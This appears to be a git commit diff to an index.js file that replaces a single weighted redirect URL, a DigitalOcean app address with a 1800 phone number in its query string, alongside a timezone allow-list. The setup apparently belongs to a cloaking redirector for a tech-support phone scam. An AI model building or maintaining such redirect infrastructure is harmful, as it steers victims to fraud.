b602269763747c85b399d327fd17d5e306db101c
paalakash <palaksh452@gmail.com>
2026-06-18 07:22:51 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://orca-app-hl6id.ondigitalocean.app/werrx01USAHTML/?bcda=1800-320-629", weight: 1.0 }
+    { url: "https://stingray-app-ku5uz.ondigitalocean.app/werrx01USAHTML/?bcda=1800-320-629", weight: 1.0 }
     
 ];
 
